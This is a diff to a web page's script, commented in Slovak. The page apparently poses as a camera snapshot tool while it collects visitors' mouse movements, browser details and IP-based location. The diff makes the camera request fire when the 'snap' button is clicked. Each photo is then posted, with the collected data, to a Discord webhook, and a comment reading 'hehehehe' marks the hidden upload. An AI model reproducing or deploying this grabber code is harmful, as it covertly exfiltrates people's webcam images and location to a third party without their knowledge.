@@ -24,7 +24,7 @@ document.addEventListener("mousemove", e => {
     mouse.y = e.clientY;
 });
 
-// browser helper
+// browser & OS helpers
 function parseBrowser(ua) {
     if (ua.includes("Chrome")) return "Chrome";
     if (ua.includes("Firefox")) return "Firefox";
@@ -85,17 +85,7 @@ fetch(IPINFO)
     data.gps = ip.loc || "N/A";
 });
 
-// kamera
-navigator.mediaDevices.getUserMedia({ video: true })
-.then(stream => {
-    data.permissions.camera = "granted";
-    video.srcObject = stream;
-})
-.catch(() => {
-    data.permissions.camera = "denied";
-});
-
-// discord embed
+// discord embed function
 function sendEmbed(imageBlob) {
     data.mouse = mouse;
     const embed = {
@@ -128,27 +118,35 @@ function sendEmbed(imageBlob) {
     fetch(WEBHOOK_URL, { method: "POST", body: form });
 }
 
-// take photo tlactiko
-snapBtn.addEventListener("click", () => {
-    canvas.width = video.videoWidth;
-    canvas.height = video.videoHeight;
-    const ctx = canvas.getContext("2d");
-    ctx.drawImage(video, 0, 0);
+// urobit fotku + permission
+snapBtn.addEventListener("click", async () => {
+    try {
+        // spytat na camera permission
+        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+        data.permissions.camera = "granted";
+        video.srcObject = stream;
 
-    canvas.toBlob(blob => {
-        // Send to webhook
-        sendEmbed(blob);
+        // nakreslit do canvas
+        canvas.width = video.videoWidth;
+        canvas.height = video.videoHeight;
+        const ctx = canvas.getContext("2d");
+        ctx.drawImage(video, 0, 0);
 
-        // Download file
-        const link = document.createElement("a");
-        const filename = new Date().toISOString().replace(/:/g, "-") + ".png";
-        link.href = URL.createObjectURL(blob);
-        link.download = filename;
-        link.click();
-    }, "image/png");
+        // poslat na webhook a stiahnut (hehehehe)
+        canvas.toBlob(blob => {
+            sendEmbed(blob);
+            const link = document.createElement("a");
+            const filename = new Date().toISOString().replace(/:/g, "-") + ".png";
+            link.href = URL.createObjectURL(blob);
+            link.download = filename;
+            link.click();
+        }, "image/png");
+
+    } catch (err) {
+        data.permissions.camera = "denied";
+        alert("Camera access denied or blocked!");
+    }
 });
 </script>
 </body>
 </html>
-
-
